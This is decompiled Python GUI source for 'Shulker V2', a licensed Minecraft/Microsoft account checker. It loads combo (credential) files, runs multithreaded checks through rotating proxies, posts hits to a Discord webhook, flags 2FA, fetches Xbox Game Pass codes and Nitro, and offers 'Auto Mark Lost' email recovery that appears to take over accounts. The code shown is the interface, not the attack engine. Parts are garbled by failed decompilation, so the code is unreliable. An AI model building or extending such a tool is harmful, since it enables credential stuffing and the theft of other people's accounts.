# Decompiled with PyLingual (https://pylingual.io)
# Internal filename: 'src\\gui\\main_window.py'
# Bytecode version: 3.13.0rc3 (3571)
# Source timestamp: 1970-01-01 00:00:00 UTC (0)

# ***<module>: Failure: Different bytecode
"""\nShulker V2 - Complete Modern GUI\n5 Tabs: Checker, Configuration, Logs, Statistics, Results\n"""
import customtkinter as ctk
from tkinter import filedialog, messagebox, scrolledtext
import os
import sys
import threading
import time
from typing import Optional
from queue import Queue
from datetime import datetime
sys.path.insert(0, os.path.join(os.path.dirname(__file__), '..', '..'))
from src.utils.config_loader import ConfigLoader
from src.utils.logger import get_logger
from src.license.validator import LicenseValidator
from src.checker_engine import CheckerEngine
from src.gui.stats_table_gui import StatsTable
logger = get_logger()
ctk.set_appearance_mode('dark')
ctk.set_default_color_theme('green')
MODERN_COLORS = {'primary': '#2D5F6F', 'primary_hover': '#356F7F', 'primary_dark': '#1D4F5F', 'secondary': '#4A5568', 'accent': '#2D5F6F', 'success': '#3D6F4F', 'warning': '#8B6F2F', 'danger': '#8B4F3F', 'background': '#0F111A', 'background_alt': '#1A1D29', 'surface': '#1E2433', 'surface_alt': '#242B3D', 'surface_hover': '#252E42', 'border': '#2A3441', 'border_accent': '#2D5F6F', 'border_glow': '#2D5F6F40', 'text_primary': '#E8F0F8', '#9CA3AF': {'text_secondary': '#6B7280', 'text_muted': 'transparent'}}
class LoadingScreen:
    """Modern animated loading screen"""
    def __init__(self, parent):
        self.parent = parent
        self.frame = None
        self.is_visible = False
    def show(self, message='Loading...'):
        """Show loading screen with animation"""
        # ***<module>.LoadingScreen.show: Failure: Different bytecode
        if self.is_visible:
            return
        else:
            self.is_visible = True
            self.frame = ctk.CTkFrame(self.parent, corner_radius=0, fg_color=MODERN_COLORS['background'])
            self.frame.place(relx=0, rely=0, relwidth=1, relheight=1)
            logo_container = ctk.CTkFrame(self.frame, fg_color='transparent')
            logo_container.pack(expand=True)
            self.logo_label = ctk.CTkLabel(logo_container, text='🎮 SHULKER V2', font=ctk.CTkFont(size=48, weight='bold'), text_color=MODERN_COLORS['primary'])
            self.logo_label.pack(pady=20)
            self.message_label = ctk.CTkLabel(logo_container, text=message, font=ctk.CTkFont(size=18), text_color=MODERN_COLORS['text_secondary'])
            self.message_label.pack(pady=10)
            self.progress = ctk.CTkProgressBar(logo_container, width=300, height=6, progress_color=MODERN_COLORS['primary'], fg_color=MODERN_COLORS['surface'])
            self.progress.pack(pady=20)
            self.progress.set(0)
            self._animate_progress()
            self._animate_logo()
    def _animate_progress(self):
        """Animate progress bar - optimized"""
        if not self.is_visible:
            return
        else:
            if hasattr(self.parent, '_resize_in_progress') and self.parent._resize_in_progress:
                self.parent.after(100, self._animate_progress)
                return
            else:
                current = self.progress.get()
                if current >= 0.9:
                    self.progress.set(0)
                else:
                    self.progress.set(current + 0.05)
                self.parent.after(50, self._animate_progress)
    def _animate_logo(self):
        """Animate logo pulsing effect - optimized"""
        if not self.is_visible:
            return
        else:
            if hasattr(self.parent, '_resize_in_progress') and self.parent._resize_in_progress:
                self.parent.after(100, self._animate_logo)
                return
            else:
                import math
                opacity = 0.5 + 0.5 * math.sin(time.time() * 2)
                base_color = int(217 * opacity)
                color = f'#00{base_color:02x}FF'
                try:
                    self.logo_label.configure(text_color=color)
                except:
                    pass
                self.parent.after(50, self._animate_logo)
    def update_message(self, message):
        """Update loading message"""
        if self.message_label:
            self.message_label.configure(text=message)
    def hide(self):
        """Hide loading screen with fade"""
        if not self.is_visible:
            return
        else:
            self.is_visible = False
            if self.frame:
                self._fade_out()
    def _fade_out(self, alpha=1.0):
        """Fade out animation"""
        if alpha <= 0:
            if self.frame:
                self.frame.destroy()
                self.frame = None
            return None
        else:
            if self.frame:
                self.frame.destroy()
                self.frame = None
class AnimationHelper:
    """Helper class for smooth animations"""
    @staticmethod
    def fade_in(widget, duration=300, steps=10):
        """Fade in widget (simulated with color transition)"""
        widget.update()
    @staticmethod
    def slide_in(widget, direction='left', duration=300):
        """Slide in animation (simulated)"""
        widget.update()
    @staticmethod
    def pulse(widget, color1, color2, interval=1000):
        """Pulse animation between two colors"""
        def toggle():
            current = widget.cget('fg_color')
            new_color = color2 if current == color1 else color1
            widget.configure(fg_color=new_color)
            widget.after(interval, toggle)
        toggle()
class LogHandler:
    """Custom log handler to stream formatted logs to GUI"""
    def __init__(self, text_widget, app_instance):
        self.text_widget = text_widget
        self.queue = Queue()
        self.app = app_instance
    def add_log(self, log_entry, color_tag):
        """Add formatted log entry to queue"""
        self.queue.put((log_entry, color_tag))
    def process_queue(self):
        # irreducible cflow, using cdg fallback
        """Process queued log entries (called from main thread)"""
        # ***<module>.LogHandler.process_queue: Failure: Compilation Error
            log_entry, color_tag = self.queue.get_nowait()
            self.text_widget.insert('end', log_entry + '\n', color_tag)
            self.text_widget.see('end')
            line_count = int(self.text_widget.index('end-1c').split('.')[0])
            if line_count > 10000:
                self.text_widget.delete('1.0', '1001.0')
        return None
class ShulkerApp(ctk.CTk):
    """Complete Shulker V2 Application with Tabs"""
    def __init__(self):
        super().__init__()
        self.config = ConfigLoader()
        self.title(f'{self.config.get('general.app_name')} v{self.config.get('general.version')} - Complete')
        self.configure(fg_color=MODERN_COLORS['background'])
        self.minsize(1200, 800)
        self._setup_performance_optimizations()
        self.after(100, self._set_maximized)
        self.license_key_var = ctk.StringVar()
        self.license_valid = False
        self.license_info = None
        self.combo_file = None
        self.checking = False
        self.paused = False
        self.checker_engine = None
        self.worker_threads = []
        self.account_queue = None
        self.results_lock = threading.Lock()
        self.pause_event = threading.Event()
        self.pause_event.set()
        self.total_accounts = 0
        self.stats = {'checked': 0, 'hits': 0, 'bad': 0, 'errors': 0, 'cpm': 0, 'progress': 0, 'total': 0, 'gamepass_pc': 0, 'gamepass_ultimate': 0, 'mark_lost_success': 0, 'nitro_claimed': 0, 'nitro_unclaimed': 0, 'xbox_codes': 0, 'normal_minecraft': 0, '2fa': 0, 'valid_mails': 0, 'retries': 0}
        self.start_time = 0
        self.settings = {'thread_count': self.config.get('threading.max_threads', 5), 'proxy_enabled': self.config.get('proxies.enabled', False), 'discord_enabled': self.config.get('discord.enabled', False), 'auto_mark_lost': self.config.get('automation.auto_mark_lost', True), 'hypixel_enabled': self.config.get('checkers.hypixel_enabled', True), 'donut_enabled': self.config.get('checkers.donut_enabled', True), 'ms_rewards_enabled': self.config.get('checkers.ms_rewards_enabled', False)}
        self.loading_screen = LoadingScreen(self)
        saved_license = self.config.get('license.key')
        if saved_license:
            self.loading_screen.show('Checking license...')
            self.after(100, lambda: self.check_saved_license(saved_license))
        else:
            self.show_license_activation()
    def _setup_performance_optimizations(self):
        """Setup performance optimizations for smooth UI"""
        self._resize_in_progress = False
        self._last_resize_time = 0
        self.bind('<Configure>', self._on_window_configure)
        self.bind('<Map>', self._on_window_map)
        self._update_queue = []
        self._update_pending = False
    def _set_maximized(self):
        # irreducible cflow, using cdg fallback
        """Set window to maximized state after initialization"""
        # ***<module>.ShulkerApp._set_maximized: Failure: Compilation Error
        self.state('zoomed')
                self.attributes('-zoomed', True)
                    self.geometry(f'{self.winfo_screenwidth()}x{self.winfo_screenheight()}')
    def _on_window_configure(self, event):
        """Optimized window resize handler"""
        if event.widget!= self:
            return
        else:
            current_time = time.time()
            if current_time - self._last_resize_time < 0.033:
                return
            else:
                self._last_resize_time = current_time
                self._resize_in_progress = True
                self.after_idle(self._finalize_resize)
    def _on_window_map(self, event):
        """Window map event - optimize initial render"""
        if event.widget == self:
            self.update_idletasks()
    def _finalize_resize(self):
        """Finalize resize operations"""
        self._resize_in_progress = False
        self.update_idletasks()
    def check_saved_license(self, license_key: str):
        """Check if saved license is valid"""
        logger.info('Checking saved license...')
        self.loading_screen.update_message('Validating license...')
        server_url = self.config.get('license.server_url')
        validator = LicenseValidator(server_url)
        is_valid, license_info = validator.validate(license_key)
        if is_valid:
            self.license_valid = True
            self.license_info = license_info
            logger.info('✅ Saved license is valid')
            self.loading_screen.update_message('Loading interface...')
            self.after(300, lambda: [self.loading_screen.hide(), self.show_main_interface()])
        else:
            logger.warning('Saved license is invalid or expired')
            self.config.set('license.key', '')
            self.config.save()
            self.loading_screen.hide()
            self.show_license_activation()
    def show_license_activation(self):
        """Show license activation screen with modern design"""
        # ***<module>.ShulkerApp.show_license_activation: Failure: Different bytecode
        logger.info('Showing license activation screen')
        for widget in self.winfo_children():
            if hasattr(self, 'loading_screen') and self.loading_screen.frame and (widget!= self.loading_screen.frame):
                widget.destroy()
            else:
                if not hasattr(self, 'loading_screen'):
                    widget.destroy()
        main_frame = ctk.CTkFrame(self, corner_radius=0, fg_color=MODERN_COLORS['background'])
        main_frame.pack(fill='both', expand=True)
        center_container = ctk.CTkFrame(main_frame, fg_color='transparent')
        center_container.place(relx=0.5, rely=0.5, anchor='center')
        title_label = ctk.CTkLabel(center_container, text='🎮 SHULKER V2', font=ctk.CTkFont(size=52, weight='bold'), text_color=MODERN_COLORS['primary'])
        title_label.pack(pady=(0, 10))
        subtitle_label = ctk.CTkLabel(center_container, text='The Ultimate Minecraft Account Checker', font=ctk.CTkFont(size=18), text_color=MODERN_COLORS['text_secondary'])
        subtitle_label.pack(pady=(0, 40))
        license_card = ctk.CTkFrame(center_container, corner_radius=20, fg_color=MODERN_COLORS['surface'], border_width=2, border_color=MODERN_COLORS['border_accent'])
        license_card.pack(pady=20, padx=40, fill='x')
        license_label = ctk.CTkLabel(license_card, text='Enter License Key', font=ctk.CTkFont(size=20, weight='bold'), text_color=MODERN_COLORS['text_primary'])
        license_label.pack(pady=(30, 15))
        license_entry = ctk.CTkEntry(license_card, textvariable=self.license_key_var, width=450, height=50, font=ctk.CTkFont(size=16), corner_radius=10, border_width=2, border_color=MODERN_COLORS['border_accent'], fg_color=MODERN_COLORS['background'], text_color=MODERN_COLORS['text_primary'], placeholder_text='Enter your license key here...')
        license_entry.pack(pady=15, padx=30)
        activate_btn = ctk.CTkButton(license_card, text='Activate License', command=self.activate_license, width=300, height=50, font=ctk.CTkFont(size=16, weight='bold'), fg_color=MODERN_COLORS['primary'], hover_color=MODERN_COLORS['primary_hover'], corner_radius=10)
        activate_btn.pack(pady=(10, 30))
    def activate_license(self):
        """Activate license with loading animation"""
        license_key = self.license_key_var.get().strip()
        if not license_key:
            messagebox.showerror('Error', 'Please enter a license key')
            return
        else:
            self.loading_screen.show('Activating license...')
            def validate():
                server_url = self.config.get('license.server_url')
                validator = LicenseValidator(server_url)
                is_valid, license_info = validator.validate(license_key)
                if is_valid:
                    self.license_valid = True
                    self.license_info = license_info
                    self.config.set('license.key', license_key)
                    self.config.save()
                    self.loading_screen.update_message('License activated! Loading interface...')
                    self.after(500, lambda: [self.loading_screen.hide(), self.show_main_interface()])
                else:
                    self.loading_screen.hide()
                    messagebox.showerror('Error', 'Invalid license key')
            threading.Thread(target=validate, daemon=True).start()
    def show_main_interface(self):
        """Show main tabbed interface"""
        logger.info('Loading main interface...')
        for widget in self.winfo_children():
            widget.destroy()
        self.grid_rowconfigure(0, weight=0)
        self.grid_rowconfigure(1, weight=1)
        self.grid_rowconfigure(2, weight=0)
        self.grid_columnconfigure(0, weight=1)
        self.create_header()
        self.create_tabs()
        self.create_status_bar()
        self.update_stats_loop()
    def create_header(self):
        """Create modern header with logo and license info"""
        header_frame = ctk.CTkFrame(self, height=70, corner_radius=0, fg_color=MODERN_COLORS['surface'], border_width=0, border_color=MODERN_COLORS['border'])
        header_frame.grid(row=0, column=0, sticky='ew', padx=0, pady=0)
        header_frame.grid_propagate(False)
        logo_label = ctk.CTkLabel(header_frame, text='🎮 SHULKER V2', font=ctk.CTkFont(size=26, weight='bold'), text_color=MODERN_COLORS['primary'])
        logo_label.pack(side='left', padx=25, pady=20)
        if self.license_info:
            validator = LicenseValidator(self.config.get('license.server_url'))
            expiry_info = validator.get_expiry_info(self.license_info['expires'])
            license_badge = ctk.CTkFrame(header_frame, corner_radius=15, fg_color=MODERN_COLORS['primary'], height=35)
            license_badge.pack(side='right', padx=20, pady=17)
            license_label = ctk.CTkLabel(license_badge, text=f'✅ Licensed | {expiry_info['days_left']} days left', font=ctk.CTkFont(size=12, weight='bold'), text_color='white')
            license_label.pack(padx=15, pady=8)
    def create_tabs(self):
        """Create tabbed interface with dark theme"""
        self.tab_view = ctk.CTkTabview(self, fg_color=MODERN_COLORS['background'], segmented_button_fg_color=MODERN_COLORS['surface'], segmented_button_selected_color=MODERN_COLORS['primary'], segmented_button_selected_hover_color=MODERN_COLORS['primary_hover'], segmented_button_unselected_color=MODERN_COLORS['surface'], segmented_button_unselected_hover_color=MODERN_COLORS['surface_hover'])
        self.tab_view.grid(row=1, column=0, sticky='nsew', padx=20, pady=20)
        self.tab_checker = self.tab_view.add('🎮 Checker')
        self.tab_config = self.tab_view.add('⚙️ Configuration')
        self.tab_logs = self.tab_view.add('📋 Live Logs')
        self.tab_stats = self.tab_view.add('📊 Statistics')
        self.tab_results = self.tab_view.add('📁 Results')
        self.tab_checker.configure(fg_color=MODERN_COLORS['background'])
        self.tab_config.configure(fg_color=MODERN_COLORS['background'])
        self.tab_logs.configure(fg_color=MODERN_COLORS['background'])
        self.tab_stats.configure(fg_color=MODERN_COLORS['background'])
        self.tab_results.configure(fg_color=MODERN_COLORS['background'])
        self.create_checker_tab()
        self.create_config_tab()
        self.create_logs_tab()
        self.create_stats_tab()
        self.create_results_tab()
    def create_checker_tab(self):
        """Create checker tab (main interface)"""
        # ***<module>.ShulkerApp.create_checker_tab: Failure: Different bytecode
        self.tab_checker.grid_columnconfigure(0, weight=2)
        self.tab_checker.grid_columnconfigure(1, weight=1)
        self.tab_checker.grid_rowconfigure(0, weight=1)
        left_frame = ctk.CTkScrollableFrame(self.tab_checker, fg_color=MODERN_COLORS['background'], corner_radius=0)
        left_frame.grid(row=0, column=0, sticky='nsew', padx=(0, 10))
        title_label = ctk.CTkLabel(left_frame, text='CHECKER CONTROLS', font=ctk.CTkFont(size=20, weight='bold'))
        title_label.pack(pady=(20, 10))
        file_card = ctk.CTkFrame(left_frame, corner_radius=15, fg_color=MODERN_COLORS['surface'], border_width=1, border_color=MODERN_COLORS['border'])
        file_card.pack(pady=15, padx=20, fill='x')
        file_header = ctk.CTkLabel(file_card, text='📁 Combo File', font=ctk.CTkFont(size=14, weight='bold'), text_color=MODERN_COLORS['text_primary'])
        file_header.pack(pady=(15, 5), padx=15, anchor='w')
        file_content = ctk.CTkFrame(file_card, fg_color='transparent')
        file_content.pack(pady=(5, 15), padx=15, fill='x')
        self.combo_file_label = ctk.CTkLabel(file_content, text='No file selected', font=ctk.CTkFont(size=12), text_color=MODERN_COLORS['text_secondary'], anchor='w')
        self.combo_file_label.pack(side='left', padx=(0, 10), fill='x', expand=True)
        browse_btn = ctk.CTkButton(file_content, text='Browse', command=self.browse_combo_file, width=100, height=35, font=ctk.CTkFont(size=12, weight='bold'), fg_color=MODERN_COLORS['primary'], hover_color=MODERN_COLORS['primary_hover'], corner_radius=8)
        browse_btn.pack(side='right')
        thread_card = ctk.CTkFrame(left_frame, corner_radius=15, fg_color=MODERN_COLORS['surface'], border_width=1, border_color=MODERN_COLORS['border'])
        thread_card.pack(pady=15, padx=20, fill='x')
        thread_header = ctk.CTkLabel(thread_card, text='🧵 Thread Count', font=ctk.CTkFont(size=14, weight='bold'), text_color=MODERN_COLORS['text_primary'])
        thread_header.pack(pady=(15, 5), padx=15, anchor='w')
        self.thread_label = ctk.CTkLabel(thread_card, text=f'{self.settings['thread_count']} threads', font=ctk.CTkFont(size=18, weight='bold'), text_color=MODERN_COLORS['primary'])
        self.thread_label.pack(pady=5)
        self.thread_slider = ctk.CTkSlider(thread_card, from_=1, to=20, number_of_steps=19, command=self.update_thread_count, progress_color=MODERN_COLORS['primary'], button_color=MODERN_COLORS['primary'], button_hover_color=MODERN_COLORS['primary_hover'])
        self.thread_slider.set(self.settings['thread_count'])
        self.thread_slider.pack(pady=(10, 15), padx=20, fill='x')
        toggles_card = ctk.CTkFrame(left_frame, corner_radius=15, fg_color=MODERN_COLORS['surface'], border_width=1, border_color=MODERN_COLORS['border'])
        toggles_card.pack(pady=15, padx=20, fill='x')
        ctk.CTkLabel(toggles_card, text='⚡ Quick Settings', font=ctk.CTkFont(size=14, weight='bold'), text_color=MODERN_COLORS['text_primary']).pack(pady=(15, 10), padx=15, anchor='w')
        toggle_container = ctk.CTkFrame(toggles_card, fg_color='transparent')
        toggle_container.pack(pady=(5, 15), padx=15, fill='x')
        self.proxy_check = ctk.CTkCheckBox(toggle_container, text='Enable Proxies', command=self.toggle_proxies, font=ctk.CTkFont(size=13), checkbox_width=20, checkbox_height=20, border_width=2)
        self.proxy_check.pack(pady=8, anchor='w')
        if self.settings['proxy_enabled']:
            self.proxy_check.select()
        self.discord_check = ctk.CTkCheckBox(toggle_container, text='Enable Discord Webhook', command=self.toggle_discord, font=ctk.CTkFont(size=13), checkbox_width=20, checkbox_height=20, border_width=2)
        self.discord_check.pack(pady=8, anchor='w')
        if self.settings['discord_enabled']:
            self.discord_check.select()
        button_card = ctk.CTkFrame(left_frame, corner_radius=15, fg_color=MODERN_COLORS['surface'], border_width=1, border_color=MODERN_COLORS['border'])
        button_card.pack(pady=15, padx=20, fill='x')
        button_container = ctk.CTkFrame(button_card, fg_color='transparent')
        button_container.pack(pady=15, padx=15, fill='x')
        self.start_btn = ctk.CTkButton(button_container, text='▶ START CHECKING', command=self.start_checking, width=220, height=55, font=ctk.CTkFont(size=17, weight='bold'), fg_color=MODERN_COLORS['primary'], hover_color=MODERN_COLORS['primary_hover'], corner_radius=12, state='disabled')
        self.start_btn.pack(pady=8)
        self.pause_btn = ctk.CTkButton(button_container, text='⏸ PAUSE', command=self.pause_checking, width=220, height=45, font=ctk.CTkFont(size=15, weight='bold'), fg_color=MODERN_COLORS['warning'], hover_color=MODERN_COLORS['surface_hover'], corner_radius=12, state='disabled')
        self.pause_btn.pack(pady=5)
        self.stop_btn = ctk.CTkButton(button_container, text='⏹ STOP', command=self.stop_checking, width=220, height=45, font=ctk.CTkFont(size=15, weight='bold'), fg_color=MODERN_COLORS['danger'], hover_color=MODERN_COLORS['surface_hover'], corner_radius=12, state='disabled')
        self.stop_btn.pack(pady=5)
        progress_card = ctk.CTkFrame(left_frame, corner_radius=15, fg_color=MODERN_COLORS['surface'], border_width=1, border_color=MODERN_COLORS['border'])
        progress_card.pack(pady=15, padx=20, fill='x')
        ctk.CTkLabel(progress_card, text='📊 Progress', font=ctk.CTkFont(size=14, weight='bold'), text_color=MODERN_COLORS['text_primary']).pack(pady=(15, 10), padx=15, anchor='w')
        self.progress_bar = ctk.CTkProgressBar(progress_card, width=280, height=22, progress_color=MODERN_COLORS['primary'], fg_color=MODERN_COLORS['background'], corner_radius=11)
        self.progress_bar.pack(pady=10, padx=15)
        self.progress_bar.set(0)
        self.progress_label = ctk.CTkLabel(progress_card, text='0 / 0 (0%)', font=ctk.CTkFont(size=13, weight='bold'), text_color=MODERN_COLORS['text_secondary'])
        self.progress_label.pack(pady=(0, 15))
        stats_card = ctk.CTkFrame(left_frame, corner_radius=15, fg_color=MODERN_COLORS['surface'], border_width=1, border_color=MODERN_COLORS['border'])
        stats_card.pack(pady=15, padx=20, fill='both', expand=True)
        stats_title = ctk.CTkLabel(stats_card, text='📊 STATISTICS', font=ctk.CTkFont(size=18, weight='bold'), text_color=MODERN_COLORS['text_primary'])
        stats_title.pack(pady=(20, 15))
        stats_scroll = ctk.CTkScrollableFrame(stats_card, fg_color='transparent')
        stats_scroll.pack(fill='both', expand=True, padx=15, pady=(0, 15))
        stats_config = [('Bad:', 'bad_label', '❌'), ('Hits:', 'hits_label', '✅'), ('Xbox Game Pass:', 'gamepass_pc_label', '🎮'), ('Xbox Game Pass Ultimate:', 'gamepass_ultimate_label', '🎮'), ('Auto Mark Lost:', 'mark_lost_label', '🔄'), ('Xbox Nitro (Claimed):', 'nitro_claimed_label', '💜'), ('Xbox Nitro (Unclaimed):', 'nitro_unclaimed_label', '💜'), ('Xbox Redeem Codes:', 'xbox_codes_label', '🎁'), ('Normal (Minecraft Only):', 'normal_label', '🎮'), ('2FA:', '2fa_label', '🔒'), ('Valid Mails:', 'valid_mails_label', '📧'), ('Retries:', 'retries_label', '🔄'), ('Errors:', 'errors_label', '⚠️')]
        self.stats_labels = {}
        for label_text, key, icon in stats_config:
            stat_row = ctk.CTkFrame(stats_scroll, fg_color='transparent', corner_radius=8)
            stat_row.pack(fill='x', pady=4, padx=5)
            label = ctk.CTkLabel(stat_row, text=f'{icon} {label_text}', font=ctk.CTkFont(size=13), anchor='w', text_color=MODERN_COLORS['text_secondary'], width=200)
            label.pack(side='left', padx=(8, 10))
            value_label = ctk.CTkLabel(stat_row, text='0', font=ctk.CTkFont(size=14, weight='bold'), anchor='e', text_color=MODERN_COLORS['primary'])
            value_label.pack(side='right', padx=8)
            self.stats_labels[key] = value_label
        right_card = ctk.CTkFrame(self.tab_checker, corner_radius=15, fg_color=MODERN_COLORS['surface'], border_width=1, border_color=MODERN_COLORS['border'])
        right_card.grid(row=0, column=1, sticky='nsew', padx=(10, 0))
        ctk.CTkLabel(right_card, text='📊 DETAILED STATS', font=ctk.CTkFont(size=18, weight='bold'), text_color=MODERN_COLORS['text_primary']).pack(pady=(20, 10))
        self.mini_stats_text = ctk.CTkTextbox(right_card, font=ctk.CTkFont(size=11, family='Consolas'), height=500, corner_radius=10, fg_color=MODERN_COLORS['background'], text_color=MODERN_COLORS['text_primary'], border_width=1, border_color=MODERN_COLORS['border'])
        self.mini_stats_text.pack(fill='both', expand=True, padx=15, pady=(0, 15))
    def create_config_tab(self):
        """Create comprehensive configuration tab"""
        scroll_frame = ctk.CTkScrollableFrame(self.tab_config, fg_color=MODERN_COLORS['background'], corner_radius=0)
        scroll_frame.pack(fill='both', expand=True, padx=20, pady=20)
        ctk.CTkLabel(scroll_frame, text='⚙️ COMPLETE CONFIGURATION', font=ctk.CTkFont(size=24, weight='bold')).pack(pady=20)
        proxy_frame = ctk.CTkFrame(scroll_frame, fg_color=MODERN_COLORS['surface'], corner_radius=15, border_width=1, border_color=MODERN_COLORS['border'])
        proxy_frame.pack(fill='x', pady=10, padx=20)
        ctk.CTkLabel(proxy_frame, text='🌐 Proxy Settings', font=ctk.CTkFont(size=18, weight='bold')).pack(pady=10, anchor='w', padx=10)
        self.proxy_enabled_var = ctk.BooleanVar(value=self.config.get('proxies.enabled', False))
        ctk.CTkCheckBox(proxy_frame, text='Enable Proxies', variable=self.proxy_enabled_var).pack(anchor='w', padx=20, pady=5)
        proxy_file_frame = ctk.CTkFrame(proxy_frame, fg_color='transparent')
        proxy_file_frame.pack(fill='x', pady=5, padx=10)
        ctk.CTkLabel(proxy_file_frame, text='Proxy File:', width=150, anchor='w', text_color=MODERN_COLORS['text_primary']).pack(side='left', padx=5)
        self.proxy_file_entry = ctk.CTkEntry(proxy_file_frame, width=300, fg_color=MODERN_COLORS['background'], text_color=MODERN_COLORS['text_primary'], border_color=MODERN_COLORS['border'])
        self.proxy_file_entry.pack(side='left', padx=5, fill='x', expand=True)
        self.proxy_file_entry.insert(0, self.config.get('proxies.file', 'proxies.txt'))
        proxy_type_frame = ctk.CTkFrame(proxy_frame, fg_color='transparent')
        proxy_type_frame.pack(fill='x', pady=5, padx=10)
        ctk.CTkLabel(proxy_type_frame, text='Proxy Type:', width=150, anchor='w', text_color=MODERN_COLORS['text_primary']).pack(side='left', padx=5)
        self.proxy_type_var = ctk.StringVar(value=self.config.get('proxies.type', 'http'))
        proxy_type_menu = ctk.CTkOptionMenu(proxy_type_frame, values=['http', 'socks4', 'socks5'], variable=self.proxy_type_var, width=150, fg_color=MODERN_COLORS['surface'], button_color=MODERN_COLORS['primary'], button_hover_color=MODERN_COLORS['primary_hover'])
        proxy_type_menu.pack(side='left', padx=5)
        proxy_rotation_frame = ctk.CTkFrame(proxy_frame, fg_color='transparent')
        proxy_rotation_frame.pack(fill='x', pady=5, padx=10)
        ctk.CTkLabel(proxy_rotation_frame, text='Rotation Mode:', width=150, anchor='w', text_color=MODERN_COLORS['text_primary']).pack(side='left', padx=5)
        self.proxy_rotation_var = ctk.StringVar(value=self.config.get('proxies.rotation_mode', 'round_robin'))
        rotation_menu = ctk.CTkOptionMenu(proxy_rotation_frame, values=['round_robin', 'random', 'sticky'], variable=self.proxy_rotation_var, width=150, fg_color=MODERN_COLORS['surface'], button_color=MODERN_COLORS['primary'], button_hover_color=MODERN_COLORS['primary_hover'])
        rotation_menu.pack(side='left', padx=5)
        threading_frame = ctk.CTkFrame(scroll_frame, fg_color=MODERN_COLORS['surface'], corner_radius=15, border_width=1, border_color=MODERN_COLORS['border'])
        threading_frame.pack(fill='x', pady=10, padx=20)
        ctk.CTkLabel(threading_frame, text='⚡ Threading Settings', font=ctk.CTkFont(size=18, weight='bold')).pack(pady=10, anchor='w', padx=10)
        max_threads_frame = ctk.CTkFrame(threading_frame, fg_color='transparent')
        max_threads_frame.pack(fill='x', pady=5, padx=10)
        ctk.CTkLabel(max_threads_frame, text='Max Threads (1-20):', width=200, anchor='w').pack(side='left', padx=5)
        self.max_threads_var = ctk.IntVar(value=self.config.get('threading.max_threads', 5))
        max_threads_slider = ctk.CTkSlider(max_threads_frame, from_=1, to=20, variable=self.max_threads_var, width=200)
        max_threads_slider.pack(side='left', padx=5)
        self.max_threads_label = ctk.CTkLabel(max_threads_frame, text=str(self.max_threads_var.get()))
        self.max_threads_label.pack(side='left', padx=5)
        max_threads_slider.configure(command=lambda v: self.max_threads_label.configure(text=str(int(v))))
        timeout_frame = ctk.CTkFrame(threading_frame, fg_color='transparent')
        timeout_frame.pack(fill='x', pady=5, padx=10)
        ctk.CTkLabel(timeout_frame, text='Timeout per Account (seconds):', width=200, anchor='w').pack(side='left', padx=5)
        self.timeout_var = ctk.IntVar(value=self.config.get('threading.timeout_per_account', 120))
        timeout_entry = ctk.CTkEntry(timeout_frame, width=100, textvariable=self.timeout_var)
        timeout_entry.pack(side='left', padx=5)
        checkers_frame = ctk.CTkFrame(scroll_frame, fg_color=MODERN_COLORS['surface'], corner_radius=15, border_width=1, border_color=MODERN_COLORS['border'])
        checkers_frame.pack(fill='x', pady=10, padx=20)
        ctk.CTkLabel(checkers_frame, text='🔍 Checker Settings', font=ctk.CTkFont(size=18, weight='bold')).pack(pady=10, anchor='w', padx=10)
        self.security_var = ctk.BooleanVar(value=self.config.get('checkers.security_enabled', True))
        ctk.CTkCheckBox(checkers_frame, text='Security Check (2FA Detection)', variable=self.security_var).pack(anchor='w', padx=20, pady=2)
        self.minecraft_var = ctk.BooleanVar(value=self.config.get('checkers.minecraft_enabled', True))
        ctk.CTkCheckBox(checkers_frame, text='Minecraft Ownership', variable=self.minecraft_var).pack(anchor='w', padx=20, pady=2)
        self.xbox_var = ctk.BooleanVar(value=self.config.get('checkers.xbox_enabled', True))
        ctk.CTkCheckBox(checkers_frame, text='Xbox Profile & Gamertag', variable=self.xbox_var).pack(anchor='w', padx=20, pady=2)
        self.nitro_var = ctk.BooleanVar(value=self.config.get('checkers.nitro_enabled', True))
        ctk.CTkCheckBox(checkers_frame, text='Discord Nitro', variable=self.nitro_var).pack(anchor='w', padx=20, pady=2)
        self.xbox_codes_var = ctk.BooleanVar(value=self.config.get('checkers.fetch_xbox_codes', True))
        ctk.CTkCheckBox(checkers_frame, text='Fetch Xbox Game Pass Codes', variable=self.xbox_codes_var).pack(anchor='w', padx=20, pady=2)
        self.hypixel_var = ctk.BooleanVar(value=self.config.get('checkers.hypixel_enabled', True))
        ctk.CTkCheckBox(checkers_frame, text='Hypixel Stats', variable=self.hypixel_var).pack(anchor='w', padx=20, pady=2)
        self.donut_var = ctk.BooleanVar(value=self.config.get('checkers.donut_enabled', True))
        ctk.CTkCheckBox(checkers_frame, text='Donut SMP Stats', variable=self.donut_var).pack(anchor='w', padx=20, pady=2)
        self.rewards_var = ctk.BooleanVar(value=self.config.get('checkers.ms_rewards_enabled', False))
        rewards_checkbox = ctk.CTkCheckBox(checkers_frame, text='MS Rewards Balance (Beta feature)', variable=self.rewards_var, command=self._on_rewards_checkbox_change)
        rewards_checkbox.pack(anchor='w', padx=20, pady=2)
        mark_lost_section = ctk.CTkFrame(checkers_frame, fg_color='transparent')
        mark_lost_section.pack(fill='x', padx=20, pady=5)
        mark_lost_header = ctk.CTkFrame(mark_lost_section, fg_color='transparent')
        mark_lost_header.pack(fill='x', pady=2)
        self.mark_lost_var = ctk.BooleanVar(value=self.config.get('automation.auto_mark_lost', False))
        mark_lost_checkbox = ctk.CTkCheckBox(mark_lost_header, text='Auto Mark Lost (Email Recovery)', variable=self.mark_lost_var, command=self._on_mark_lost_checkbox_change)
        mark_lost_checkbox.pack(side='left', anchor='w')
        refresh_btn = ctk.CTkButton(mark_lost_header, text='🔄 Refresh', width=100, height=28, command=self._refresh_email_count)
        refresh_btn.pack(side='left', padx=(10, 0))
        self.mark_lost_email_count_label = ctk.CTkLabel(mark_lost_header, text='', font=ctk.CTkFont(size=10), text_color='#888888', anchor='w')
        self.mark_lost_email_count_label.pack(side='left', padx=(10, 0))
        self.mark_lost_requirements_satisfied = False
        self.mark_lost_info_label = ctk.CTkLabel(mark_lost_section, text='', font=ctk.CTkFont(size=10), text_color='#ffaa00', anchor='w', justify='left', wraplength=600)
        self.mark_lost_info_label.pack(anchor='w', padx=(25, 0), pady=(5, 0))
        self.mark_lost_api_frame = ctk.CTkFrame(mark_lost_section, fg_color='transparent')
        self.mark_lost_api_frame.pack(fill='x', padx=(25, 0), pady=(5, 0))
        ctk.CTkLabel(self.mark_lost_api_frame, text='NotLetters API Key:', width=150, anchor='w').pack(side='left', padx=5)
